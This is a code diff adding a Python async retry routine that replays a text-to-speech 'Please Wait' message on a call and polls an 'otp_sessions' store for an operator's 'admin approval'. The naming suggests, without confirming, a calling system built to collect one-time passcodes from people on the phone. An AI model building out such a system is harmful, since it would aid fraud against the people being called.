@@ -544,6 +544,51 @@ async def play_step3_with_retry(session_id: str, session: dict, call_id: str):
     # No admin response after 2 plays - keep waiting (don't hangup, admin might still respond)
     await emit_log(session_id, "info", "⏳ Still waiting for admin approval...")
 
+async def play_step3_retry_only(session_id: str, session: dict, call_id: str):
+    """Play Step 3 retry (Play 2 only) - called after Play 1 is already done"""
+    step3_text = session["messages"]["step3"]
+    
+    # Wait for TTS Play 1 to finish first
+    word_count = len(step3_text.split())
+    tts_wait = max(5, int(word_count / 2.5) + 2)
+    await asyncio.sleep(tts_wait)
+    
+    # Wait for admin response (30 seconds for first wait)
+    for _ in range(30):
+        await asyncio.sleep(1)
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        status = fresh_session.get("status", "") if fresh_session else ""
+        if status in ["completed", "step2"]:
+            logger.info("Step 3 admin responded during wait")
+            return
+    
+    # No response - play message again (Play 2)
+    fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+    status = fresh_session.get("status", "") if fresh_session else ""
+    if status in ["completed", "step2"]:
+        return
+    
+    await emit_log(session_id, "warning", "⚠️ No admin response, playing message again...")
+    await emit_log(session_id, "step", "🎙️ Playing Step 3: Please Wait (Play 2/2)...")
+    await play_tts(call_id, step3_text, session.get("language", "en"))
+    
+    # Wait for TTS to finish
+    await asyncio.sleep(tts_wait)
+    
+    await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
+    
+    # Wait for admin response (40 seconds for second wait)
+    for _ in range(40):
+        await asyncio.sleep(1)
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        status = fresh_session.get("status", "") if fresh_session else ""
+        if status in ["completed", "step2"]:
+            logger.info("Step 3 admin responded during wait after play 2")
+            return
+    
+    # No admin response after 2 plays - keep waiting
+    await emit_log(session_id, "info", "⏳ Still waiting for admin approval...")
+
 # ==================== AUTH ROUTES ====================
 
 @auth_router.post("/register", response_model=TokenResponse)
